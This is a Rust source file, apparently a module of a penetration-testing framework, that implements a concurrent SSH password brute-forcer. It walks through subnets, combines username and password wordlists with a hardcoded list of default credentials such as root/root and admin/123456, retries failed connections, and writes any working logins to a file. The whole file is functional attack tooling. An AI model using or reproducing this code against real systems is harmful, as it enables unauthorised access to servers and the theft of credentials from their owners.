use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    net::TcpStream,
    sync::atomic::{AtomicBool, Ordering},
    sync::Arc,
    time::Duration,
    io::Write,
};
use tokio::{
    sync::{Mutex, Semaphore},
    task::spawn_blocking,
    time::{sleep, timeout},
};
use futures::stream::{FuturesUnordered, StreamExt};

use crate::utils::{
    normalize_target,
    load_lines, get_filename_in_current_dir,
    cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_port,
    cfg_prompt_output_file,
};
use crate::modules::creds::utils::{BruteforceStats, is_subnet_target, parse_subnet, subnet_host_count};

// Constants
const DEFAULT_SSH_PORT: u16 = 22;
const PROGRESS_INTERVAL_SECS: u64 = 2;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
];


pub async fn run(target: &str) -> Result<()> {
    println!("{}", "=== SSH Brute Force Module ===".bold());
    println!("[*] Target: {}", target);

    if is_subnet_target(target) {
        let network = parse_subnet(target)?;
        let count = subnet_host_count(&network);
        println!("{}", format!("[*] Subnet {} — {} hosts to scan sequentially", target, count).cyan());
        for ip in network.iter() {
            let ip_str = ip.to_string();
            println!("\n{}", format!("[*] >>> Scanning host: {}", ip_str).cyan().bold());
            if let Err(e) = Box::pin(run(&ip_str)).await {
                println!("{}", format!("[!] Error on {}: {}", ip_str, e).yellow());
            }
        }
        println!("\n{}", "[*] Subnet scan complete.".green().bold());
        return Ok(());
    }

    let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT)?;

    // Ask about default credentials
    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true)?;
    
    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true)? {
        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist")?)
    } else {
        None
    };
    
    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true)? {
        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist")?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10")?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5")?;
        input.parse::<u64>().unwrap_or(5).max(1).min(60)
    };

    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true)?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2")?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true)?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true)?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "ssh_brute_results.txt")?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false)?;
    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false)?;

    let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|_| format!("{}:{}", target, port));

    println!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            println!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            println!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            println!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        println!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    // Calculate total attempts
    let total_attempts = if combo_mode {
        usernames.len() * passwords.len()
    } else {
        passwords.len()
    };
    println!("{}", format!("[*] Total attempts: {}", total_attempts).cyan());
    println!();

    let found = Arc::new(Mutex::new(Vec::new()));
    let unknown = Arc::new(Mutex::new(Vec::<(String, String, String, String)>::new()));
    let stop = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(BruteforceStats::new());
    let semaphore = Arc::new(Semaphore::new(concurrency));
    let timeout_duration = Duration::from_secs(connection_timeout);

    // Start progress reporter
    let stats_clone = stats.clone();
    let stop_clone = stop.clone();
    let progress_handle = tokio::spawn(async move {
        loop {
            if stop_clone.load(Ordering::Relaxed) {
                break;
            }
            stats_clone.print_progress();
            sleep(Duration::from_secs(PROGRESS_INTERVAL_SECS)).await;
        }
    });

    let mut tasks = FuturesUnordered::new();
    let mut user_cycle_idx = 0usize;

    for pass in passwords.iter() {
        if stop_on_success && stop.load(Ordering::Relaxed) {
            break;
        }

        let selected_users: Vec<String> = if combo_mode {
            usernames.iter().cloned().collect()
        } else {
            if usernames.is_empty() {
                Vec::new()
            } else {
                let user = usernames[user_cycle_idx % usernames.len()].clone();
                user_cycle_idx += 1;
                vec![user]
            }
        };

        for user in selected_users {
            if stop_on_success && stop.load(Ordering::Relaxed) {
                break;
            }

            let addr_clone = connect_addr.clone();
            let user_clone = user.clone();
            let pass_clone = pass.clone();
            let found_clone = Arc::clone(&found);
            let unknown_clone = Arc::clone(&unknown);
            let stop_clone = Arc::clone(&stop);
            let stats_clone = Arc::clone(&stats);
            let semaphore_clone = semaphore.clone();
            let timeout_clone = timeout_duration;
            let stop_flag = stop_on_success;
            let verbose_flag = verbose;
            let retry_flag = retry_on_error;
            let max_retries_clone = max_retries;

            tasks.push(tokio::spawn(async move {
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                // Acquire semaphore permit inside the spawned task
                let _permit = match semaphore_clone.acquire_owned().await {
                    Ok(permit) => permit,
                    Err(_) => return,
                };
                
                if stop_flag && stop_clone.load(Ordering::Relaxed) {
                    return;
                }

                let mut retries = 0;
                loop {
                    match try_ssh_login(&addr_clone, &user_clone, &pass_clone, timeout_clone).await {
                        Ok(true) => {
                            println!("\r{}", format!("[+] {} -> {}:{}", addr_clone, user_clone, pass_clone).green());
                            let mut found_guard = found_clone.lock().await;
                            // Check if already found to avoid duplicates
                            let entry = (addr_clone.clone(), user_clone.clone(), pass_clone.clone());
                            if !found_guard.contains(&entry) {
                                found_guard.push(entry);
                            }
                            stats_clone.record_attempt(true, false);
                            if stop_flag {
                                stop_clone.store(true, Ordering::Relaxed);
                            }
                            break;
                        }
                        Ok(false) => {
                            stats_clone.record_attempt(false, false);
                            if verbose_flag {
                                println!("\r{}", format!("[-] {} -> {}:{}", addr_clone, user_clone, pass_clone).dimmed());
                            }
                            break;
                        }
                        Err(e) => {
                            stats_clone.record_attempt(false, true);
                            let msg = e.to_string();
                            if retry_flag && retries < max_retries_clone {
                                retries += 1;
                                stats_clone.record_retry();
                                if verbose_flag {
                                    println!(
                                        "\r{}",
                                        format!(
                                            "[!] {} -> {}:{} (retry {}/{}) - {}",
                                            addr_clone,
                                            user_clone,
                                            pass_clone,
                                            retries,
                                            max_retries_clone,
                                            msg
                                        )
                                        .yellow()
                                    );
                                }
                                sleep(Duration::from_millis(500)).await;
                                continue;
                            } else {
                                {
                                    let mut unk = unknown_clone.lock().await;
                                    unk.push((
                                        addr_clone.clone(),
                                        user_clone.clone(),
                                        pass_clone.clone(),
                                        msg.clone(),
                                    ));
                                }
                                if verbose_flag {
                                    println!(
                                        "\r{}",
                                        format!(
                                            "[?] {} -> {}:{} error/unknown: {}",
                                            addr_clone, user_clone, pass_clone, msg
                                        )
                                        .yellow()
                                    );
                                }
                                break;
                            }
                        }
                    }
                }
            }));
        }
    }

    // Wait for all tasks with FuturesUnordered
    while let Some(res) = tasks.next().await {
         if let Err(e) = res {
            if verbose {
                println!("\r{}", format!("[!] Task error: {}", e).red());
            }
        }
    }

    stop.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    stats.print_final().await;

    let creds = found.lock().await;
    if creds.is_empty() {
        println!("\n{}", "[-] No credentials found.".yellow());
    } else {
        println!("\n{}", format!("[+] Found {} valid credential(s):", creds.len()).green().bold());
        for (host, user, pass) in creds.iter() {
            println!("     {} -> {}:{}", host, user, pass);
        }

        if let Some(path_str) = save_path {
            let filename = get_filename_in_current_dir(&path_str);
            // Use std::fs::File for simple writing
            use std::fs::File;
            let mut file = File::create(&filename)?;
            for (host, user, pass) in creds.iter() {
                writeln!(file, "{} -> {}:{}", host, user, pass)?;
            }
            file.flush()?;
            println!("{}", format!("[+] Results saved to '{}'", filename.display()).green());
        }
    }

    drop(creds);

    // Unknown / errored attempts
    let unknown_guard = unknown.lock().await;
    if !unknown_guard.is_empty() {
        println!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored SSH responses.",
                unknown_guard.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true)? {
            let default_name = "ssh_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            )?;
            let filename = get_filename_in_current_dir(&fname);
            use std::fs::File;
            match File::create(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# SSH Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in unknown_guard.iter() {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    println!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    println!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

async fn try_ssh_login(
    normalized_addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let handle = spawn_blocking(move || {
            let tcp = TcpStream::connect(&addr_owned)
                .map_err(|e| anyhow!("Connection error: {}", e))?;
            
            let mut sess = Session::new()
                .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
            sess.set_tcp_stream(tcp);
            
            sess.handshake()
                .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;
            
            sess.userauth_password(&user_owned, &pass_owned)
                .map_err(|e| anyhow!("Authentication failed: {}", e))?;
            
            Ok(sess.authenticated())
    });

    let join_result = timeout(timeout_duration, handle)
        .await
        .map_err(|_| anyhow!("Connection timeout"))?;

    join_result.map_err(|e| anyhow!("Join error: {}", e))?
}